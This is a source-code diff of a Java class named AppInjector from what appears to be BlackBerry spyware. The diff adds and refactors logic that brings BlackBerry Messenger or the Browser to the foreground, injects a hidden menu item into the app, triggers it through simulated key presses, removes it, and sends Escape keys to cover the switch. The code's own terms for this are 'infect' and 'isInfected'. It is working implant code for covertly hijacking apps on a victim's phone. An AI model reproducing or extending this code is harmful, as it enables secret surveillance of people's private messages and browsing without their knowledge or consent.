@@ -2,20 +2,22 @@ package blackberry.injection;
 
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
-import blackberry.agent.im.BBMMenuItem;
+import net.rim.device.api.ui.Keypad;
+import blackberry.agent.im.AppInjectorBBM;
+import blackberry.agent.url.AppInjectorBrowser;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.utils.Utils;
 
 public class AppInjector {
-    public static final int APP_BBM = 0;
-    public static final int APP_BROWSER = 0;
+    public static final int APP_BBM = 1;
+    public static final int APP_BROWSER = 2;
     //#ifdef DEBUG
     private static Debug debug = new Debug("AppInjector", DebugLevel.VERBOSE);
     //#endif
-    
+
     private AppInjectorInterface delegate;
-    boolean infected;
-    
+
     ApplicationManager manager = ApplicationManager.getApplicationManager();
 
     public AppInjector(int app) throws Exception {
@@ -23,47 +25,49 @@ public class AppInjector {
             //#ifdef DEBUG
             debug.trace("AppInjector BBM");
             //#endif
-            delegate= AppInjectorBBM.getInstance();
+            delegate = AppInjectorBBM.getInstance();
         } else if (app == APP_BROWSER) {
             //#ifdef DEBUG
             debug.trace("AppInjector BROWSER");
             //#endif
-            delegate= AppInjectorBrowser.getInstance();
+            delegate = AppInjectorBrowser.getInstance();
         } else {
             //#ifdef DEBUG
-            debug.error("AppInjector, wrong value: " +app);
+            debug.error("AppInjector, wrong value: " + app);
             //#endif
             throw new Exception();
         }
     }
-    
+
     public boolean callMenuByKey() {
         //#ifdef DEBUG
         debug.trace("callMenu");
         //#endif
-        
+
         final int foregroundProcess = manager.getForegroundProcessId();
-
-        BBMMenuItem bbmMenu = BBMMenuItem.getInstance();
-
+        
         // debug.trace("searching Messenger or Browser");
         ApplicationDescriptor[] apps = manager.getVisibleApplications();
         for (int i = 0; i < apps.length; i++) {
 
-            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
-                if (manager.getProcessId(apps[i]) == foregroundProcess) {
-                    infected = delegate.callMenuByKey();
+            if (manager.getProcessId(apps[i]) == foregroundProcess) {
+                //#ifdef DEBUG
+                debug.trace("callMenuByKey foreground: " + apps[i].getName());
+                //#endif
+
+                if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
+                    delegate.callMenuByKey();
                 }
             }
         }
         return false;
     }
-    
+
     public boolean isInfected() {
-        
+
         boolean infected = delegate.isInfected();
         //#ifdef DEBUG
-        debug.trace("isInfected: "+infected);
+        debug.trace("isInfected: " + infected);
         //#endif
         return infected;
     }
@@ -73,17 +77,77 @@ public class AppInjector {
         debug.trace("callInContext");
         //#endif
         delegate.callMenuInContext();
-        
+
     }
 
-    public boolean infect() {
-        delegate.requestForeground();
-        delegate.injectMenu();
-        callMenuByKey();
-        delegate.deleteMenu();
+    public void infect() {
+        int req = requestForeground();
+        Utils.sleep(500);
+        boolean fore = checkForeground();
         
-        return infected;
+        if (fore) {
+            Utils.sleep(500);
+            delegate.injectMenu();
+            Utils.sleep(500);
+            callMenuByKey();
+            Utils.sleep(500);
+            delegate.deleteMenu();
+            Utils.sleep(500);
+
+            if (req == 2) {
+                KeyInjector.pressKeyCode(Keypad.KEY_ESCAPE);
+                KeyInjector.pressKey(Keypad.KEY_ESCAPE);
+                
+                KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);                
+                KeyInjector.pressRawKey(Keypad.KEY_ESCAPE);
+                
+                //MenuWalker.walk("Close");
+            }
+        }
     }
 
+    private boolean checkForeground() {
+        int foregroundPin = manager.getForegroundProcessId();
+        ApplicationDescriptor[] apps = manager.getVisibleApplications();
+        for (int i = 0; i < apps.length; i++) {
+            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
+                int processId = manager.getProcessId(apps[i]);
+
+                if (foregroundPin == processId) {
+                    return true;
+                }else{
+                    return false;
+                }
+            }
+        }
+        return false;
+    }
+
+    private int requestForeground() {
+        int foregroundPin = manager.getForegroundProcessId();
+        ApplicationDescriptor[] apps = manager.getVisibleApplications();
+        for (int i = 0; i < apps.length; i++) {
+            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
+                int processId = manager.getProcessId(apps[i]);
+
+                if (foregroundPin == processId) {
+                    //#ifdef DEBUG
+                    debug.trace("requestForeground: already foreground");
+                    //#endif
+                    return 1;
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("requestForeground: bringing foreground");
+                    //#endif
+                    manager.requestForeground(processId);
+                    return 2;
+                }
+
+            }
+        }
+       
+
+        return 0;
+    }
 
 }
